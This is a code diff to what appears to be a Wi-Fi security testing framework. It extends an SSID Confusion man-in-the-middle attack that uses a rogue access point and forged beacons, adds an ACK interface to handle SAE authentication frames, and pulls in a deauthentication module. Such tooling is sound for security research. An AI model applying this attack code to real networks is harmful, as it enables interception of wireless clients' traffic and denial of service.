@@ -1,4 +1,5 @@
 #include "attacks/DoS_soft/channel_switch/channel_switch.h"
+#include "attacks/DoS_soft/deauth/deauth.h"
 #include "attacks/DoS_soft/expected_vht_beacon/expected_vht_beacon.h"
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
@@ -51,6 +52,11 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 	rogue_ap.get(SK::permanent_mac) + ")";
 
 
+	// rogue channel ACKs: active monitor avoids AP VIF responding to client's SAE auth frames
+	const bool prefer_active = att_cfg.value("prefer_active", false);
+	setup_ack_iface(rs, rogue_ap, HWAddress<6>(rogue_ap.get(SK::mac)),
+		netconfig.rogue_channel, prefer_active, rogue_ap->get_ap_iface(), *confused_beacon);
+
 	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
 	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
 	sock_real->set_filter(bpf);
@@ -94,6 +100,8 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     	}
 
 		if(next_beacon <= steady_clock::now()) {
+            sock_real->log_drops("sock_real");
+            sock_rogue->log_drops("sock_rogue");
             confused_beacon->timestamp(confused_beacon_ts0 +
                 static_cast<uint64_t>(duration_cast<microseconds>(steady_clock::now() - start).count()));
             send_to_rogue(*confused_beacon);
@@ -108,6 +116,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
         }
     }
     rs.process_manager.write_log_all(ATTACK_STOP_tag);
+	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
 	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" },  rogue_sta[SK::netns], true);
 
 }
